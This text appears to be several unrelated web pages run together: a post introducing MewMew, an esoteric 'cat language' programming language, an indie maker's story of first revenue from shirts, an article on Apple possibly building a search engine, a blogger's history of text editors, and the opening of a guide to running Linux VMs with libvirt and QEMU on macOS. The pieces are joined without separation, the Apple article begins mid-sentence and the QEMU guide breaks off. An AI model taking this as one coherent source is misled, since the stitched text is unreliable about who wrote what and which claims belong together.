<p>Programming in Cats’ language , it is lunacy or what? But it’s reality. With MewMew one can program in cats’ language, but it is not actually the cats’ language but the human interpretation of cats’ language , mew mew mew.
MewMew is an esoteric programming language built with ANTLR4 and C++. It is not intended to be used for commercial or mainstream programming instead , it was designed to be learning project for me or any other novice language designer who want get started building their own programming language.
While majority of programming languages are in English or I should say human languages but this language intends to be one of the first language to be in ‘non-human’ (not technically) language.</p>



<p>MewMew is implemented using ANTLR4 and C++. Though using Dynamically typed host language would be given me more flexibilty designing the language, I chose to use a statically typed for a multiple reasons , First it is fast. Second , the language becomes much more runtime safe. When experimenting with early prototypes , I tried Python and PLY (Python Lex and Yacc) , Tatsu and even Flex &amp; Bison. Python and PLY was not chosen because it was too much slow , even Cythonzing didn’t give advantage. Tatsu was kind of better than PLY but again speed issue, and Flex &amp; Bison , I didn’t chose them because of their over complexity , a language small as MewMew required a huge codebase. Finally I setteled for ANTLR4 , It was comparativaly fast thanks to its ALL(*) algorithm , on top of that the API of it was very easy to catch on but also very robust.
When Designing MewMew , I left some places which can be used to improve or extend the language in future.</p>

<p>MewMew doesn’t use any traditional numbers (0 to 9) instead it uses ‘mew’s. For example , ‘mew’ will get converted to 1 , ‘mewmew’ will get converted to 2  , ‘mewmewmewmewmewmewmewmewmewmew’ will get converted to 10 and so on so forth but zero has special case , to get only zero one can use ‘mew-mew’.
MewMew also has few operator similar to C++, which are discussed in GitHub project repository README. MewMew is all about numbers, it doesn’t contain any other types such as strings , chars , arrays etc , which keeps the language lightweight. Every number in mewmew is a floating point number.
MewMew also has if , if else and a repeat loop aka. Meow loop expression. It also has a special type of function called scratch function which open the door of extending the language in future. Syntax of if statement is something like Expression ? Statements ; where ‘Expression’ takes any type of expression , on Truthy value the ‘Statements’ will get executed. Similar to that Expression ? Statements1 : Statements2 ; is the syntax of if-else statement, if the value of ‘Expression’ is truthy the ‘Statements1’ will get executed else ‘Statement2’ will get executed. The syntax of meow loop is something like this @ Expression : Statements; the ‘Statements’ will get executed N times where N = Expression. Scratch function syntax is something like #(Expression) where ‘#’ can be repeated from 1 to many times. But as of 5 functions are defined only.</p>

<p>Here’s a comparison of some simple program written in MewMew and C++ :</p>

<table>
  <thead>
    <tr>
      <th>In MewMew</th>
      <th>In C++</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>m=mew;<br>@#####(mew):<br>m % mewmew == mew – mew ?<br>::m;<br>;<br>m = m + mew;<br>;<br></td>
      <td>#include <iostream><br>using namespace std;<p>int main()<br>{<br>for(int m = 1; m &lt;= 100 ; ++m){<br>if (m%2 == 0){<br>cout &lt;&lt; m &lt;&lt; endl;<br>}<br>}<br>}</p></iostream></td>
    </tr>
    <tr>
      <td>m=mew;<br>@####(mew):<br>m % mewmewmew == mew – mew &amp; m % ###(mew) == mew – mew ? <br>::m;<br>;<br>m = m + mew;<br>;<br></td>
      <td>#include <iostream><br>using namespace std;<p>int main()<br>{<br>for(int m = 1; m &lt;= 100 ; ++m){<br>if (m%3 == 0 &amp;&amp; m%5==0){<br>cout &lt;&lt; m &lt;&lt; endl;<br>}<br>}<br>}</p></iostream></td>
    </tr>
  </tbody>
</table>



<p>MewMew is an esoteric language which is morelike a joke than a commercial language. It was created to be a leaning project for which it has done successfully. In future it also might work as an reference to learning language designing for future.With the scratch function it opens new doors forexpanding the language in future. It will only took a few lines of code in switch…case statement to add a new function.</p>

<p><span>In every industry but tech, there’s hundreds of competitors within each vertical.</span></p>
<p><span>By building something that already exists, it curtails the initial validation period for a product.</span></p>
<p><span>As a maker, it’s taken me over two years to truly understand this concept.</span></p>
<p><span>After listening to every Indie Hackers podcast, this was a common theme I’d recognised between the most successful products.</span></p>
<p><span>Whether it be Less Annoying CRM, Transistor.FM, or The Hustle, these products entered a pre-conceived vertical with existing customer demand.</span></p>
<p><span>Until now, it feels like I’ve spent my early 20’s in the pursuit of product/market fit.</span></p>
<p><span>What I never understood, was that it already existed across thousands of markets.</span></p>
<p><span>With a background working in tech startups, I’ve always valued innovation above anything else.</span></p>
<p><span>After spending two full years failing to gain any product traction, I realised this was my greatest weakness as a maker.</span></p>
<p><span>After two years of building products, I’d generated $0 in revenue.</span></p>
<p><span>In August 2020, I generated my first $66 (AUD) from a product in less than 24 hours.</span></p>
<p><span>How did I do it?</span></p>
<p><span>By prioritising validation instead of innovation.</span></p>
<p><span>Although it’s not much, this $66 was a gargantuan milestone in my maker journey.</span></p>

<p><span>Let me quickly backtrack and give you a brief history of my experiences leading to this point.</span></p>
<p><span>If you’re an early-stage maker struggling to generate revenue, this post will share some actionable insights to help streamline your own product journey.</span></p>


<hr>


<p><span><b>June 2018</b></span></p>
<p><span>In 2018, I had my first surreal moment to becoming a maker. It was my first idea for a product.</span></p>
<p><span>I wanted to build the </span><a href="https://dribbble.com/" target="_blank" rel="noopener"><span>Dribbble</span></a><span> for digital marketers.</span></p>
<p><span>As a digital marketer myself, I planned to create a platform where I could showcase a portfolio of my real work.&nbsp;</span></p>
<p><span>My vision was to build the worlds leading community hub for digital marketers, streamlining the way they showcase work and source job opportunities.</span></p>
<p><span>As a non-technical maker, I started building with the tools I had.&nbsp;</span></p>
<p><span>Before creating a product, I spent a year of my life trying to build an existing community as a Facebook group.</span></p>
<p><span>At its peak, I’d grown this community to roughly 300 members, although I’m sure only a fraction of these were active users.</span></p>
<p><span>Looking back, I’m thankful that I tried to build a community before creating a product, although, to be fair, I didn’t have any other option – I didn’t know how to code.</span></p>


<hr>


<p><span><b>June 2019</b></span></p>
<p><span>A year later, I stumbled across the no-code landscape.&nbsp;</span></p>
<p><span>This changed everything.</span></p>
<p><span>I could finally build my grand vision for a platform.</span></p>
<p><span>This was where I started spiralling down a path of first-time maker mistakes.</span></p>
<p><span>Did I even bother to ask my community if this was a platform they wanted?</span></p>
<p><span>No.</span></p>
<p><span>Did I validate the idea?</span></p>
<p><span>Certainly not.</span></p>
<p><span>Was this a product that could even generate revenue from day one?</span></p>
<p><span>Not a chance.</span></p>
<p><span>So when November of 2019 came around, I was so confused when my platform hadn’t gained any real traction.</span></p>
<p><span>I’d spent four straight months building this product, then an additional two months trying to gain user adoption.</span></p>
<p><span>I completely burnt myself out trying to maintain something that never had a chance.</span></p>
<p><span>So what did I decide to do?</span></p>
<p><span>Tear it down and start again.</span></p>


<hr>


<p><span><b>January 2020</b></span></p>
<p><span>It’s a new year and I’d had the opportunity to learn first-hand from my past mistakes.</span></p>
<p><span>At this point, I’m 18 months into making and I hadn’t generated a single dollar in revenue.</span></p>
<p><span>This time around, I had clear expectations and guidelines to follow.</span></p>
<ol>
<li><span>I had to sell to businesses</span></li>
<li><span>I wasn’t allowed to build a product until I’d confidently validated an idea</span></li>
</ol>
<p><span>At this point, I was freelancing as a digital marketer, so I was still eager to build a product within this industry.</span></p>
<p><span>After hearing </span><a href="https://www.indiehackers.com/forum/how-to-build-a-life-you-love-by-quitting-everything-else-with-lynne-tye-of-key-values-706009faea" target="_blank" rel="noopener"><span>Lynne Tye’s episode</span></a><span> of the Indie Hackers podcast, I knew exactly what I needed to build.</span></p>
<p><span>I was going to build the </span><a href="https://www.keyvalues.com/" target="_blank" rel="noopener"><span>Key Values</span></a><span> for digital marketers. It’d be a place where passionate digital marketers could source opportunities with teams that shared their values.</span></p>
<p><span>One of the core reasons why I’m a freelancer is because I’d never found a company to work for that shared my own personal values.</span></p>
<p><span>I was absolutely blown away when I first heard Lynne’s story.</span></p>
<p><span>Her product wasn’t anything technically advanced, and her background wasn’t in marketing. So how was it that Lynne was able to gain as much traction as she did?</span></p>
<p><span>She solved a real problem for businesses and spent a long time validating her idea.</span></p>
<p><span>I was eager to get started, but I encountered my first problem.</span></p>
<p><span>I live in Brisbane, Australia. In my city, I’ve never met a startup big enough to need a dedicated marketing team.</span></p>
<p><span>What was my alternative?</span></p>
<p><span>I knew I had to get myself over to SF – the heart of the startup landscape.&nbsp;</span></p>
<p><span>From an outsiders perspective, there was an endless sea of opportunity there.</span></p>
<p><span>I booked my flights for May, then start cold emailing as many marketing recruiters as possible.</span></p>
<p><span>I shared the concept of my product and asked if they’d be interested in joining pre-launch.</span></p>
<p><span>Within a few weeks, I’d been on calls with recruiters from Intercom, Pinterest, Harry’s, and Tray.io.</span></p>
<p><span>My plan was to get these brands on board before launch – making the product more valuable when I release it to the public.</span></p>
<p><span>I didn’t expect to charge these initial brands. I was simply looking for validation.</span></p>
<p><span>On March 13th, I had a call with a recruiter from a startup that had recently raised a $50 million round.</span></p>
<p><span>She was looking to quickly scale her marketing team with quality candidates.</span></p>
<p><span>“This is exactly the kind of product I need right now”.</span></p>
<p><span>Then. The unbelievable happened.</span></p>
<p><span>“So, we’re obviously happy to pay you for the work you do with this. How much is it going to cost”.</span></p>
<p><span>I freeze.</span></p>
<p><span>I genuinely didn’t expect the call to veer this way.</span></p>
<p><span>I respond.</span></p>
<p><span>“Well. Umm. It’s free for any brands that join before launch, but later we can talk about paying for access to additional features I have in my backlog”.</span></p>
<p><span>WHAT. THE. FUCK.</span></p>
<p><span>I couldn’t explain how disappointed I was in myself. At the same time, I was at an all-time high.</span></p>
<p><span>I finally had early signs of validation.</span></p>
<p><span>This feeling only lasted a short week.&nbsp;</span></p>
<p><span>COVID came.</span></p>
<p><span>It didn’t spare anyone in the recruitment industry.</span></p>
<p><span>I was so close, but the timing couldn’t have been worse.</span></p>
<p><span>I knew this wasn’t going away for a long time.</span></p>


<hr>


<p><span><b>April 2020</b></span></p>
<p><span>Throughout isolation, I needed a project to keep me sane.</span></p>
<p><span>I decided to break my own rule and start building my product.</span></p>
<p><span>I knew this wasn’t a good use of my time, but what else was I going to do during COVID?</span></p>
<p><span><span>I build the</span> </span><a href="https://clickthrough.marketing/" target="_blank" rel="noopener"><span>site</span></a><span> in WordPress, then started working on SEO tasks. I was determined to use this downtime during COVID to build an organic growth machine.</span></p>
<p><span>I started building backlinks and publishing content. It’d been years since I had the chance to work on any SEO projects, so I used this time to up-skill my practical knowledge as a digital marketer.</span></p>
<p><span>In the space of four months, I managed to generate 142 high-quality backlinks, tripling my sites domain ranking.</span></p>

<p><span>As any SEO knows, building backlinks was an absolute slog.</span></p>
<p><span>This whole process involved writing original 2,000 – 3,000 word guest articles for some of the industries biggest publishers.</span></p>
<p><span>At the same time, I needed to also publish high-quality content to my own site to start ranking for keywords that would generate traffic.</span></p>
<p><span>Every second week, I’d publish a 5,000 article to my own site. You can check these out </span><a href="https://clickthrough.marketing/most-in-demand-marketing-skills-2020/" target="_blank" rel="noopener"><span>here</span></a> <span>and </span><a href="https://clickthrough.marketing/top-product-marketing-manager-interview-questions/" target="_blank" rel="noopener"><span>here</span></a><span>.</span></p>
<p><span>Surely enough, I started to burn out.</span></p>
<p><span>As someone that doesn’t enjoy writing, the thought of having to create another article started to make me feel sick.</span></p>
<p><span>I needed something else to temporarily work on.</span></p>


<hr>


<p><span><b>August 2020</b></span></p>
<p><span>I decided to take a day off and clean my house. I started clearing my wardrobe of the clothes I no longer wore.</span></p>
<p><span>It’d been years since I’d bought new clothes, so my wardrobe didn’t cater to my recent taste or personality.</span></p>
<p><span>As an overly passionate maker, I wanted to start wearing startup shirts throughout my everyday life.</span></p>
<p><span>The only problem, however, is that startups shirts are notoriously hideous and bold.</span></p>


<div><figure><img data-attachment-id="3100" data-permalink="https://lachlankirkwood.com/2020/08/27/product-maker-journey/startup-shirts/" data-orig-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png" data-orig-size="1200,628" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Startup-Shirts" data-image-description="" data-medium-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=300" data-large-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=748" src="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=1024" alt="Startup teeshirts" srcset="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=1024 1024w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=150 150w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=300 300w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=768 768w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p><span>There it was. A new problem.</span></p>
<p><span>My solution…</span></p>
<p><span>Why don’t I just make my own?</span></p>
<p><span>I wanted to create a minimalist series of shirts that I could wear to any occasion. Whether I’m working at home, going out to dinner, or meeting with friends, these shirts needed to be discrete enough to match the rest of my wardrobe.</span></p>

<p><span>I jump online and print three of my own custom shirts. It costs me $75.</span></p>
<p><span>Then it hit me. I wonder if other makers like myself who experience this same problem.</span></p>
<p><span>I sent a photo to my friend who’s a software engineer, then tell him my idea.</span></p>
<p><span>His response.</span></p>

<p><span>It’s time to get to work, but this time I planned to be scrupulous about the process.</span></p>
<p><span>My goal was to spend a day validating this idea, then determine if it was something I should pursue.</span></p>
<p><span>If I couldn’t validate the concept, I’d return to posting blog content.</span></p>
<p><span>I spent a few hours creating some shirt designs in Canva.</span></p>
<p><span>Next, I was I’m ready to build my own online store.</span></p>
<p><span>I had to stop myself there.</span></p>
<p><span>If I’m building a Shopify store, I’ll need to buy a domain, design the store itself, then pay for a Shopify subscription.</span></p>
<p><span>This would consume too much time and money. After all, I’m only seeking validation.</span></p>
<p><span>I head to Teespring. I upload my designs to their print-on-demand store and use their default storefront.</span></p>
<p><span>I give it a basic name (Maker Threads) and spend two minutes designing a logo,</span></p>
<p><span>At this point, the store doesn’t look like anything special. I didn’t even have my own custom domain.</span></p>

<p><span>If users truly saw the value in my product, I should be able to sell just one shirt to validate the idea.</span></p>
<p><span>As a digital marketer, the old me would have happily thrown $100 behind some Facebook ads to acquire these customers. This time, I wasn’t going to let myself spend a dollar.</span></p>
<p><span>On a Sunday night (AEST), I launch the store on Product Hunt and with zero expectations.</span></p>
<p><span>Like most small makers, every Product Hunt launch I’ve shared in the past has amassed to no traction.</span></p>
<p><span>This time was different.</span></p>

The deal ensures that iPhone, iPad, and Mac users search with Google when they use Safari. That is unless they manually change the default search engine in Safari’s preferences.</p><p>The deal between Apple and Google may be coming to an end soon. In July 2020, Reuters reported that the U.K. Competition and Markets Authority was <a href="https://www.reuters.com/article/us-apple-google/uk-regulators-take-aim-at-apples-search-engine-deal-with-google-idUSKBN242748">taking aim at the deal</a>.</p><blockquote><p>Given the impact of preinstallations and defaults on mobile devices and Apple’s significant market share, it is our view that Apple’s existing arrangements with Google create a significant barrier to entry and expansion for rivals affecting competition between search engines on mobiles.</p><cite>U.K. Competition and Markets Authority Report</cite></blockquote><p>If the U.K. regulators take action, there may be a ripple effect from the European Union, which has a history of <a href="https://en.wikipedia.org/wiki/European_Union_vs._Google">going after Google for anti-competitive behavior</a>. Regulators in Europe may force Apple to remove Google as the default search engine and have users choose which search engine they want to use when they first launch Safari.</p><h2>Why Apple might be launching a search engine</h2><p>Regulatory pressure, a contentious relationship with Google, and the maturation of Apple’s Siri and iCloud are presenting an opportunity for Apple to create and launch a search engine. There are several signs right now that indicate Apple may be doing just that.</p><h3>Apple doesn’t need Google’s money</h3><p>Apple is now the world’s most valuable company. They may want the money Google gives them, but they don’t need it.</p><h3>Apple is pouring resources and money into search</h3><p>Apple is investing heavily in search, as shown in their <a href="https://jobs.apple.com/en-us/search?search=search%20engineer&amp;sort=relevance">job postings for search engineers</a>. The job listings reveal they incorporate AI, ML, NLP, and more into all of their services and apps.</p><h3>iOS and iPadOS 14 beta bypasses Google Search with Spotlight Search</h3><p>It’s not clear if Apple uses Bing anymore, as results are labeled only as Siri Suggestions. It is clear that Apple has started to return search results within Spotlight Search and is <a href="https://www.coywolf.news/seo/ios-ipados-14-spotlight-search-google-threat/">completely bypassing Google</a> altogether.</p> <stream src="ce5235df57f7501f313fe1eeada06ece" poster="https://videodelivery.net/ce5235df57f7501f313fe1eeada06ece/thumbnails/thumbnail.jpg?time=7s" preload="" autoplay="" loop="" mute=""></stream>  <h3>Apple recently updated its Applebot web crawler page</h3><p>In July 2020, Apple published a significant update to its <a href="https://support.apple.com/en-us/HT204683">About Applebot support page</a>. The additions are very similar to the details Google provides to <a href="https://www.coywolf.news/topics/webmaster/">webmasters</a> and <a href="https://www.coywolf.news/topics/seo/">SEOs</a>. Here are the changes they made to the Applebot support page.</p><ul><li>Added how to verify traffic from Applebot</li><li>Expanded details on the Applebot user agent, including differences between its desktop and mobile version</li><li>Expanded robots.txt rules</li><li>Added a section stating that they don’t just crawl HTML, but also render pages similar to Google</li><li>Added a section on search rankings and the factors that affect how it ranks web search results</li></ul><h3>Applebot has been busy crawling sites</h3><p>Checking my server logs on <a href="https://coywolf.io/wpengine">WP Engine</a> revealed that Applebot had been regularly crawling my sites daily, something I haven’t noticed until now.</p><figure><img loading="lazy" width="1820" height="1563" src="https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files.png" alt="" srcset="https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files.png 1820w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-300x258.png 300w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-1024x879.png 1024w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-768x660.png 768w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-1536x1319.png 1536w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-734x630.png 734w, https://www.coywolf.news/wp-content/uploads/2020/08/applebot-log-files-150x129.png 150w" sizes="(max-width: 1820px) 100vw, 1820px"><figcaption>Server log of Applebot crawling Coywolf News</figcaption></figure><h2>What Apple has to gain from launching a search engine</h2><p>A search engine from Apple will likely look and function slightly different from modern search engines like Google, Bing, and DuckDuckGo. That’s because Apple historically likes to do things differently, and their search engine will serve a different purpose than showing ads and data mining.</p><p>Based on Apple’s numerous search engineer job descriptions, and the continued consolidation of web and app results in Spotlight Search, an Apple search engine will likely function as a highly personalized data hub. It will be similar to Google Assistant on Android, but different since it (initially) won’t have ads, will be completely private, and have significantly deeper integrations with the OS.</p><p>One can imagine getting easy buy-in from users if they benefit from privacy, coupled with the seamless integration and personalization of their iCloud data. Apple can leverage AI and ML to deliver search results based on their email, messages, maps, events, reminders, notes, photos, files, contacts, music, news, TV shows and movies, third-party apps, documents, and more. And they can do it without ads and with the promise of real data privacy.</p><p>Apple has a lot to gain from this model. Some of the main benefits include:</p><ul><li>The promotion of apps in search results that will benefit Apple’s services and detract from <a href="https://coywolf.pro/webmaster/progressive-web-app-pwa/">Google’s push towards PWAs</a>.</li><li>A weakening of Google’s monopoly on search and a significant blow to its ad revenue and data mining.</li><li>The promotion of Apple products and services. Including struggling services like Apple News+ and Apple TV+.</li><li>Continued control and lock down of the Apple ecosystem. Users will become dependent on personalized search results with deep service and product integrations that are only possible via their search engine.</li><li>The extension of their ad serving platform will allow app developers to promote their apps in search results.</li></ul><h2>What will this mean for SEO?</h2><p>If Apple can capture enough market share, it will force SEOs to adapt and optimize for their search engine. In some ways, at least based on their Applebot documentation, tactics will remain the same.

August 26, 2020 | https://blog.iansinnott.com/editor-overload/ | <a href="https://web.archive.org/web/*/https://blog.iansinnott.com/editor-overload/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Every so often my programming productivity takes a steep dive as I try to use a new text editor. </p>
<p>Why do I put myself through this? Simply put, I'm a bit of an efficiency fanatic. Fanatic in the sense of pursuing some end with not-entirely-rational vigor and passion. I call it fanatical because the pursuit of ever more efficiency in and of itself takes quite a bit of time, thus actively working against my ostensible goal of being more productive.</p>
<p>Whatever, it's a hobby.</p>

<p>Let's make a timeline. </p>
<h2><code>2011</code> Dreamweaver</h2>
<p>Oh yeah, I started there. This was when I first started learning web development and thought to myself "It's just text and images, how much harder than Word could it be?"</p>
<p>I'm not putting Dreamweaver down—it was actually a very good start. There were professional video tutorials about it since it was part of the Adobe suite. It even had code mode, which is just like any normal text editor.</p>
<p>However, it was not to last. Even with code mode I felt like I wasn't a <span>programmer</span>, whatever that meant. I felt like I needed more of a hacker-ish interface on which to work my magic. </p>
<h2><code>2011</code> Coda</h2>
<p>Yes, same year as Dreamweaver. After a bit of Dreamweaver I discovered Coda, a pretty nifty text editor that's <a href="https://www.panic.com/coda/">still around</a> (as of 2020-08-20). Why do I say that as if it's a big deal? Well, I'd be surprised if anyone who started programming after 2013 knows about it. This is not to say anything bad about the product, I just never met a single other programmer who had used it.</p>
<p>The cool feature that drew me in to Coda was that it could know about your websites. As far as I remember it was pitched as a great editor for creating front-end sites (JS, CSS, HTML). Back then my move was to write some code, open an FTP app and then drag/drop the files into it. Coda handled this nicely and saved me time. </p>
<h2><code>2013</code> Sublime Text</h2>
<p>Then, the programming world collectively gasps as Sublime Text 2 sweeps over the industry (* I doubt the Vim/Emacs people cared much, but as  you can see I was not yet among their numbers).</p>
<p>Sublime Text was just <span>awesome</span>. It was <span>fast</span>. It was minimal yet powerful which appealed to the power user in me. It was <span>not</span> intuitive, it was <span>not</span> discoverable, it was configured via JSON! It was exactly what I wanted.</p>
<p>For two whole years Sublime Was my primary editor and it was great. Along the way it taught me the power of dedicated tools, rather than an integrated suite. I used different apps for my terminal, my FTP client and my editor. </p>
<p>Of course my time with Sublime and the productivity it won me made me want more, and thus paved the way towards the black hole of text editors, the editor form which—once you have learned it—you will never fully detach yourself.</p>
<h2><code>2015</code> Vim</h2>
<p>In 2015 it finally clicked. This was something of a watershed moment in my text editing career. After years of false starts Vim finally took hold of my fingertips and things have never been the same since.</p>
<p>For anyone unaware, Vim is an ancient text editor from the 70s¹ that might already be installed on your computer. It's claim to fame is that it let's you edit <span>any text</span> with only the keyboard. No mouse interaction whatsoever. </p>
<p>Vim is hard to learn. Significantly harder than learning touch-typing. Anyone who already knows how to program but does't know Vim could probably pick it up in a month. However, it took me years. This was probably due to the fact that even I have my limits when it comes to "productivity hacking" and Vim will really, <span>really</span> decrease your productivity for a time. So I never used it much, just gave it another try here and there and eventually it stuck.</p>
<h3>Is it worth it? </h3>
<p>Yes, but it's not for everyone. </p>
<p>If you write a lot of code, or even just prose, using Vim is nothing short of magical. It feels like being in the future already, when computers simply do what we think. </p>
<p>A mouse is an imprecise device. Analog motion (i.e. your hand sliding a mouse across a desk) is relatively intuitive, but it's slow compared to directly telling the computer what you want. Anyone who's used software professionally for long enough understands this. Designers, architects, authors, anyone who uses a computer as a creative tool and uses it <span>a lot</span> eventually feels the strain of repetitive interactions. That's why professional software packages have numerous hotkeys. Even your operating system has numerous hotkeys, even if you don't know them or use them much.</p>
<p>When you're using Vim, everything is a hotkey. Every action you take you take with keys, which offers a great deal of precision and speed when it comes to editing text. </p>
<p>A quick example. Let's say you want to select all the text "here, within these quotes." What do you do? Normally, you just drag the mouse over all the text within the quotes and start typing. No problem! Now consider you have to do this many times a day, perhaps hundreds of times a day, with different text. Sometimes the text wraps around the screen, causing you to have to move your mouse further. Sometimes you accidentally drag too far or not far enough, causing you to have to hit undo and try again. This may all sound minor, but again, consider having to do it hundreds of times a day.</p>
<p>Now, if you're a Vim user you just type <code>ci"</code>. Three characters. The mnemonic for this sequence is "change inner <code>"</code>." The interesting thing is you can use that same <code>ci</code> "change inner ..." command with other characters. For instance <code>ci'</code> will let you change all the text inside single quotes. <code>ci(</code> will let you change all the text inside parens, and so on. It's quite a flexible and highly productive system (once you learn it).</p>
<h2><code>2016</code> Vim + Atom</h2>
<p>Enter Atom. I actually don't have a lot to say about Atom. I used it as my secondary editor since, again, once you've internalized Vim you never go back. However, Vim has a significant drawback: You have to program it to make it play nicely with new languages. That's right, you have to write code just to get your editor to let you write more code in an appealing way.</p>
<p>This is where Atom came in. It's a mainstream text editor in the sense that it has lots of features built-in and it will do its best to help you along the way. It also has a plugin repository where you can search for new plugins that do things like support new programming languages. It even has—and this is key—a plugin to emulate Vim!</p>
<p>So I ended up using Atom whenever I had to work with code that I hadn't yet configured Vim for. It worked out of the box, it was intuitive and it sort of supported Vim-like editing. </p>
<p>Perhaps most importantly, at this point my company had hired other developers and as the senior member of the team I needed to be able to recommend a way to edit our codebase—that recommendation was Atom.</p>
<h2><code>2018</code> Vim + VSCode</h2>
<p>So after a couple of years I decided to revisit VSCode. I honestly don't know why, but it became hugely popular and so it came across my radar again. It's a great text editor, but in my view it fills the space that Atom was in so I'm not sure why anyone switched 🤷‍♂️.</p>
<p>Regardless, I tried it out and thought "this is ok." The thing was, at this point I was a much more experienced programmer and <span>really didn't want</span> to spend time not directly solving whatever problem I was working on. I had little patience for configuring text editors, so whenever I tried a new language I would just open up VSCode instead of Vim since it would either immediately work well or have a plugin I could install.</p>
<p>VSCode still filled the space of secondary text editor until one day I discovered <a href="https://github.com/asvetliakov/vscode-neovim">a plugin for VSCode that embeds Vim</a>... 🤯 </p>
<p>Thus the balance switched. Now I use VSCode (in Vim mode) as my primary text editor and Vim as the secondary.</p>
<h2><code>2020</code> Vim + VSCode + Emacs</h2>
<p>And finally we're caught up. 2020 and I'm trying a new text editor. Why? Blame Clojure. Emacs and Lisp languages go very well together so I decided to try out Emacs, and it's pretty neat.</p>
<p>For anyone who doesn't know, Emacs is as old as Vim and has a similar keyboard-centric philosophy. It's also <span>even more</span> customizable than Vim, which is saying quite a lot. However, Emacs is unfortunately famous for forcing your hands into contortions to use various functions. </p>
<p>I only recently started using Emacs, so I can't actually speak to it's long-term utility but it's definitely interesting. Aside from being a lisp-based editor, which highly appeals to me, it also seems to <span>fully</span> support Vim. It emulates Vim but it does it so well that as far as I can tell you get the best of both worlds.</p>

<p>Since I haven't exactly come to any specific point, it's fortunate I didn't start writing this intending to make one. If there was one it would simply be: Pursue your hobbies. </p>
<p>Believe it or not fiddling with text editors brings me joy, so despite the occasional dips in productivity I continue to tinker. Besides, there's always the off chance that I'll become more productive. </p>

<p>This post was discussed on Hacker News: <a href="https://news.ycombinator.com/item?id=24290128">https://news.ycombinator.com/item?id=24290128</a></p>

<p><a href="#footnate">¹</a> Vim has become something of a catchall term for Vi and Vim, which are separate editors. Vi was first and Vim didn't show up until the 90s. </p></div></div>]]>

<p>I first learned about <code>libvirt</code> and <code>QEMU</code> three years ago when I wrote a guide on <a href="https://github.com/yoonsikp/macOS-KVM-PCI-Passthrough">how to virtualize macOS on a Linux system</a>. Today I will be showing the opposite, virtualizing Linux on macOS using the same tools. I was surprised that with so many software developers using MacBooks everyday, nobody has created a guide on how to use <code>libvirt</code> and <code>QEMU</code> with macOS.</p>
<p>Why is <code>libvirt</code> and <code>QEMU</code> better? First of all, it's free and open-source. Unlike Parallels Desktop and VMWare Fusion, you won't need to pay for expensive subscriptions or manage licenses. There does exist an open-source alternative (from Oracle!) called VirtualBox, which works pretty well. However, VirtualBox does not support macOS's <a href="https://developer.apple.com/documentation/hypervisor">Hypervisor.Framework</a>, a virtualization API created to limit kernel modification. This means the installer will ask for admin access to install kernel extensions, a feature Apple is now <a href="https://www.zdnet.com/article/apple-deprecating-macos-kernel-extensions-kexts-is-a-great-win-for-security/">phasing out</a> for security reasons. <code>QEMU</code> on the other hand has had support for Hypervisor.Framework since 2018. Just say no to kexts!</p>
<p>Furthermore, like many developers, I like to run VMs headless, i.e. without a desktop GUI, so that I can SSH into them. Running VMs in the background seems like a simple feature, but it requires a lot of complex configuration for both <s><a href="https://www.virtualbox.org/manual/ch07.html#headless-vm-steps">VirtualBox</a></s> and <a href="https://communities.vmware.com/thread/292873">VMWare Fusion</a>. And Parallels wants you buy the <a href="https://kb.parallels.com/en/123298">Pro Edition</a> to gain access. Market segmentation at its finest... With <code>libvirt</code>, VMs start headless. Plus, when you shutdown macOS, it sends a shutdown signal to your VMs as well.</p>
<p>To be clear, <strong>this method doesn't support USB Passthrough, GPU Passthrough, or bridge networking.</strong> But if you just need to test, for example, node.js or nginx on a Linux VM, then this method is great.</p>
<h3 id="installinglibvirtandqemu">Installing libvirt and QEMU</h3>
<ol>
<li>First, install <a href="https://brew.sh/">homebrew</a>, which is a package manager for macOS.</li>
<li>Run <code>brew install qemu gcc libvirt</code>. If you installed <code>libvirt</code> version 6.6.0, then also run the following command in Terminal (<a href="https://github.com/Homebrew/homebrew-core/issues/59738">GitHub issue</a>):<pre><code>for f in /usr/local/Cellar/libvirt/6.6.0/lib/libvirt/*/*.bundle; do ln -s $f ${f%.bundle}.so; done
</code></pre>
</li>
<li>Since macOS doesn't support QEMU security features, we need to disable them:<pre><code>echo 'security_driver = "none"' &gt;&gt; /usr/local/etc/libvirt/qemu.conf
echo "dynamic_ownership = 0" &gt;&gt; /usr/local/etc/libvirt/qemu.conf
echo "remember_owner = 0" &gt;&gt; /usr/local/etc/libvirt/qemu.conf
</code></pre>
</li>
<li>Finally start the libvirt service, with <code>brew services start libvirt</code>. It will start after boot as well.</li>
</ol>
<h3 id="installingubuntuserver2004">Installing Ubuntu Server 20.04</h3>
